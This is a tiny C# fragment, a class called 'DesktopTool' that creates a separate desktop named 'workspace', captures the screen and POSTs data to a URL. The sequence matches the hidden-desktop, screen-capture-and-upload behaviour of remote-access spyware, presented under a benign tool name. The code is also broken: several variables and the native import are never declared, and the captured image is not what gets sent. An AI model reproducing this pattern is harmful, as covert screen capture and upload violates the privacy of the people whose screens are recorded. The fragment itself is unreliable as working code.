using System.Net.Http;
class DesktopTool { void Run() {
 CreateDesktop("workspace", IntPtr.Zero, IntPtr.Zero, 0, 0, IntPtr.Zero);
 g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
 new HttpClient().PostAsync(url, status);
} }
